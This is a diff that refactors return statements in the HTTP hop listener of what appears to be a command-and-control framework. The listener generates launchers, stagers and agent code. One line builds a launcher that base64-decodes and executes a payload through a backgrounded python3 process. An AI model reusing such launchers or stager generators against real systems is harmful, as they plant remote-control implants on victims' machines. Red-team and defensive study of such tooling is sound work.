@@ -323,8 +323,7 @@ class Listener:
                 launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                     "UTF-8"
                 )
-                launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
-                return launcher
+                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
             else:
                 return launcherBase
 
@@ -332,6 +331,7 @@ class Listener:
             log.error(
                 "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
             )
+            return None
 
     def generate_stager(
         self,
@@ -478,6 +478,7 @@ class Listener:
             log.error(
                 "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
+            return None
 
     def generate_agent(
         self, listenerOptions, language=None, obfuscate=False, obfuscation_command=""
@@ -512,8 +513,7 @@ class Listener:
                     "host": host,
                 }
 
-                comms = template.render(template_options)
-                return comms
+                return template.render(template_options)
 
             elif language.lower() == "python":
                 template_path = [
@@ -528,15 +528,16 @@ class Listener:
                     "host": host,
                 }
 
-                comms = template.render(template_options)
-                return comms
+                return template.render(template_options)
 
             else:
                 log.error(
                     "listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
                 )
+                return None
         else:
             log.error("listeners/http_hop generate_comms(): no language specified!")
+            return None
 
     def start(self):
         """
